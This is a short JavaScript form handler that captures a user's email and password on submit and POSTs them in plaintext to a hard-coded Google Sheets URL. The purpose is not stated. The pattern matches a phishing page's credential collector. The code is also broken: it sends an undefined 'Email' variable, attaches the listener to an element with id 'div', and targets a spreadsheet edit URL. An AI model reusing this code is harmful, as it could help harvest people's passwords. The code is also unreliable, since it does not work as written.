document.getElementById("div").addEventListener("submit", function(event) {
  event.preventDefault();

  var username = document.getElementById('Email').value;
  var password = document.getElementById("password").value;

  var formData = {
    Email: Email,
    password: password
  };

  var url = "https://docs.google.com/spreadsheets/d/1-AUlzQurK90qZ345ueyw9bOXyMNL-Ja6z22bCqYfjSE/edit"; // Replace with your Google Apps Script web app URL

  fetch(url, {
      method: "POST",
      body: JSON.stringify(formData)
    })
    .then(response => response.json())
    .then(data => {
      console.log("Form data submitted successfully:", data);
    })
    .catch(error => {
      console.error("Error submitting form data:", error);
    });
});